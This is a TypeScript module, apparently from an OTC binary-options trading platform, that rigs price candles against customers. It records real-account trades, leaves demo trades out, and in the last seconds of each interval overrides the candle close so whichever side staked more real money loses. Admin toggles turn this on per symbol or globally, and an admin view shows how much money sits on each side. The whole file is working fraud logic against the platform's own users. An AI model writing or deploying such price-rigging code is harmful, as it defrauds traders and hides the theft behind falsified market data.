/**
 * OTC Market Manipulation – pending trades and per-symbol manipulation toggle.
 * Multi-timeframe: manipulation window depends on candle length (5s→last 2s, 10s→last 4s, 1m→last 10s, 5m→last 2min).
 * Whichever side has more real $ loses at candle close.
 */

import { OTC_SYMBOLS } from './constants.js';

/** Manipulation window (seconds before period end) per candle interval. */
const MANIPULATION_WINDOW_SEC: Record<number, number> = {
  5: 2,
  10: 4,
  15: 5,
  30: 10,
  60: 10,
  120: 20,
  180: 36,
  300: 120, // 5 min → last 2 min
};
const MANIPULATION_INTERVALS_SEC = [5, 10, 15, 30, 60, 120, 180, 300];
const BOUNDARY_TOLERANCE_MS = 2500; // trades expiring within ±2.5s of boundary
const CLEANUP_AFTER_MS = 300_000; // 5 min

export interface PendingOtcTrade {
  id: string;
  symbol: string;
  type: 'higher' | 'lower';
  amount: number;
  expiryTime: number;
  createdAt: number;
}

const pendingTrades: PendingOtcTrade[] = [];
const manipulationBySymbol = new Map<string, boolean>();

/** When true, last-10s majority-loses applies to ALL OTC markets. No per-market toggle needed. */
let globalManipulationEnabled = false;

let idCounter = 0;
function nextId(): string {
  return `otc-${Date.now()}-${++idCounter}`;
}

/**
 * Register a pending OTC trade (called when user places trade on main site).
 * Only real-account trades are stored; demo trades are ignored for manipulation (count and last-10s logic).
 */
export function addPendingTrade(
  symbol: string,
  type: 'higher' | 'lower',
  amount: number,
  expiryTime: number,
  accountType: 'real' | 'demo' = 'real'
): void {
  if (accountType !== 'real') return;
  const normalized = OTC_SYMBOLS.includes(symbol as (typeof OTC_SYMBOLS)[number]) ? symbol : null;
  if (!normalized) return;
  pendingTrades.push({
    id: nextId(),
    symbol: normalized,
    type,
    amount: Number(amount) || 0,
    expiryTime: Number(expiryTime) || 0,
    createdAt: Date.now(),
  });
}

/** Remove trades that have already expired (cleanup). */
export function removeExpired(now: number): void {
  const cutoff = now - CLEANUP_AFTER_MS;
  for (let i = pendingTrades.length - 1; i >= 0; i--) {
    if (pendingTrades[i].expiryTime < cutoff) pendingTrades.splice(i, 1);
  }
}

/** Current 1m period end (ms) – for admin stats. */
function currentPeriodEnd(nowMs: number): number {
  const s = Math.floor(nowMs / 1000);
  const periodStartSec = s - (s % 60);
  return (periodStartSec + 60) * 1000;
}

/** Stats for trades expiring near a boundary (for multi-timeframe manipulation). */
function getStatsForBoundary(
  symbol: string,
  boundaryMs: number
): { upCount: number; downCount: number; upAmount: number; downAmount: number } {
  const lo = boundaryMs - BOUNDARY_TOLERANCE_MS;
  const hi = boundaryMs + BOUNDARY_TOLERANCE_MS;
  let upCount = 0, downCount = 0, upAmount = 0, downAmount = 0;
  for (const t of pendingTrades) {
    if (t.symbol !== symbol) continue;
    if (t.expiryTime < lo || t.expiryTime > hi) continue;
    if (t.type === 'higher') {
      upCount++;
      upAmount += t.amount;
    } else {
      downCount++;
      downAmount += t.amount;
    }
  }
  return { upCount, downCount, upAmount, downAmount };
}

/** Stats for the current 1m candle period (trades expiring in this period) – for admin. */
export function getStatsForCurrentPeriod(symbol: string, nowMs: number): {
  upCount: number;
  downCount: number;
  upAmount: number;
  downAmount: number;
} {
  const periodEnd = currentPeriodEnd(nowMs);
  const periodStart = periodEnd - 60_000;
  let upCount = 0, downCount = 0, upAmount = 0, downAmount = 0;
  for (const t of pendingTrades) {
    if (t.symbol !== symbol) continue;
    if (t.expiryTime <= periodStart || t.expiryTime > periodEnd) continue;
    if (t.type === 'higher') {
      upCount++;
      upAmount += t.amount;
    } else {
      downCount++;
      downAmount += t.amount;
    }
  }
  return { upCount, downCount, upAmount, downAmount };
}

/** Next period end for an interval (ms). */
function nextBoundaryMs(nowMs: number, intervalSec: number): number {
  const intervalMs = intervalSec * 1000;
  return Math.ceil(nowMs / intervalMs) * intervalMs;
}

/**
 * Find the active manipulation interval: smallest interval for which we're in its window
 * and there are trades expiring at that boundary. Returns { intervalSec, boundaryMs } or null.
 */
function getActiveManipulationInterval(symbol: string, nowMs: number): { intervalSec: number; boundaryMs: number } | null {
  for (const intervalSec of MANIPULATION_INTERVALS_SEC) {
    const windowSec = MANIPULATION_WINDOW_SEC[intervalSec] ?? 10;
    const boundaryMs = nextBoundaryMs(nowMs, intervalSec);
    if (boundaryMs <= nowMs) continue; // boundary in past (tick exactly on boundary)
    const windowMs = windowSec * 1000;
    if (nowMs < boundaryMs - windowMs) continue; // not yet in window
    const s = getStatsForBoundary(symbol, boundaryMs);
    if (s.upAmount === 0 && s.downAmount === 0) continue;
    return { intervalSec, boundaryMs };
  }
  return null;
}

export function setManipulation(symbol: string, enabled: boolean): void {
  if (OTC_SYMBOLS.includes(symbol as (typeof OTC_SYMBOLS)[number])) {
    manipulationBySymbol.set(symbol, enabled);
  }
}

export function getManipulation(symbol: string): boolean {
  return manipulationBySymbol.get(symbol) ?? false;
}

export function setGlobalManipulation(enabled: boolean): void {
  globalManipulationEnabled = enabled;
}

export function getGlobalManipulation(): boolean {
  return globalManipulationEnabled;
}

export function getAllManipulation(): Map<string, boolean> {
  const out = new Map<string, boolean>();
  for (const s of OTC_SYMBOLS) out.set(s, manipulationBySymbol.get(s) ?? false);
  return out;
}

export interface MarketManipulationStats {
  symbol: string;
  /** Effective: true when global is ON or this symbol is individually ON */
  manipulation: boolean;
  /** Per-symbol toggle state (for admin UI when global is OFF) */
  manipulationEnabledForSymbol: boolean;
  upCount: number;
  downCount: number;
  upAmount: number;
  downAmount: number;
}

/** Get stats for all OTC symbols for the current 1m period (for admin). */
export function getAllMarketStats(nowMs: number): MarketManipulationStats[] {
  removeExpired(nowMs);
  const manip = getAllManipulation();
  const global = getGlobalManipulation();
  return OTC_SYMBOLS.map((symbol) => {
    const s = getStatsForCurrentPeriod(symbol, nowMs);
    const perSymbol = manip.get(symbol) ?? false;
    return {
      symbol,
      manipulation: global || perSymbol,
      manipulationEnabledForSymbol: perSymbol,
      ...s,
    };
  });
}

/**
 * Compute override OHLC so the candle close is on the losing side for the majority (any timeframe).
 * Uses multi-interval windows: 5s→last 2s, 10s→last 4s, 1m→last 10s, 5m→last 2min, etc.
 * getPeriodOpen(intervalSec) returns the period open for the active interval when provided.
 */
export function getManipulationOverride(
  symbol: string,
  naturalOpen: number,
  naturalHigh: number,
  naturalLow: number,
  naturalClose: number,
  nowMs: number,
  getPeriodOpen?: (intervalSec: number) => number | undefined
): { open: number; high: number; low: number; close: number } | null {
  const manipulationOn = getGlobalManipulation() || getManipulation(symbol);
  if (!manipulationOn) return null;

  const active = getActiveManipulationInterval(symbol, nowMs);
  if (!active) return null;

  const { upAmount: totalUp, downAmount: totalDown } = getStatsForBoundary(symbol, active.boundaryMs);
  if (totalUp === 0 && totalDown === 0) return null;

  const openPrice = getPeriodOpen?.(active.intervalSec) ?? naturalOpen;
  const range = Math.max(naturalHigh - naturalLow, 0.0001);
  const move = range * 0.35;

  let close: number;
  if (totalUp >= totalDown) {
    close = openPrice - move;
    if (close >= openPrice) close = openPrice - range * 0.1;
    close = Math.min(close, naturalLow - range * 0.02);
  } else {
    close = openPrice + move;
    if (close <= openPrice) close = openPrice + range * 0.1;
    close = Math.max(close, naturalHigh + range * 0.02);
  }

  const high = Math.max(naturalHigh, close, openPrice);
  const low = Math.min(naturalLow, close, openPrice);
  return {
    open: naturalOpen,
    high,
    low,
    close,
  };
}
